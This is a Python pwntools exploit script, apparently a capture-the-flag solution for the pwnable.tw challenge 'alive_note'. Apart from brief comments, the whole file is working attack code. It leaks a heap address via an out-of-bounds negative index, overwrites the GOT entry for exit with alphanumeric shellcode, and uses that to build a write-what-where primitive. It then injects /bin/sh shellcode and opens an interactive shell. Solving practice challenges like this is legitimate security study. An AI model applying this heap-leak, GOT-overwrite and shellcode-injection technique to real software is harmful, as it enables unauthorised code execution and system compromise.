# this is definitely not the intended solution
from pwn import *
context.update(os='linux', arch="i386")

p = process(["./alive_note"])
#p = remote("chall.pwnable.tw", 10300)

# methods to interact with the program
def read_note(index):
    p.sendafter("Your choice :", "2\n")
    p.sendafter("Index :", "%d\n" % index)
    p.readuntil("Name : ")
    return u32(p.read(4))

def write_note(index, note):
    p.sendafter("Your choice :", "1\n")
    p.sendafter("Index :", "%d\n" % index)
    p.sendafter("Name :", "%s\n" % note)

def delete_note(index):
    p.sendafter("Your choice :", "3\n")
    p.sendafter("Index :", "%d\n" % index)

write_note(0, "AAAABBBB") # write temp note to get addr on heap
note_addr = read_note(-482) # read that addr from a ref to &note
log.info("NOTE: %08x", note_addr)
delete_note(0) # delete it so the next note will be at the same addr

sc = asm('''
push eax;
push eax;
popad;
popad;          // pop values from stack into the right regs
xor [edi], esi; // use popped values for write-what-where
inc edi;        // "nops"
inc edi;        // "nops"
''') # weird shellcode ('PPaa17GG') sets up stack for write primitive
write_note(-23, sc) # write it into the GOT for <exit>

new_sc = asm('''
push ecx; // ecx contains a ret addr in main
ret;      // ret to prevent SIGSEG
''').ljust(4,"\x90") # first write will use main ret addr in ecx

newnote = p32(note_addr + 8) + new_sc
write_note(0, newnote) # write described above

xors = [0x00020ff1] + [0x00000000]*15
sc = asm(shellcraft.linux.sh())

# write real shellcode after alnum sc
for o in range(0, len(sc), 4):
    newnote = (p32(note_addr + 12 + o) + 
        p32(u32(sc[o:o+4].ljust(4,"\x90"))^xors[o/4]))

    write_note(0, newnote)

#gdb.attach(p, "b *0x8048520\nc\n")

newnote = p32(note_addr + 8) + p32(u32("\x90"*4)^u32(new_sc))
write_note(0, newnote) # write nops over ret to run shellcode
p.read()
p.interactive()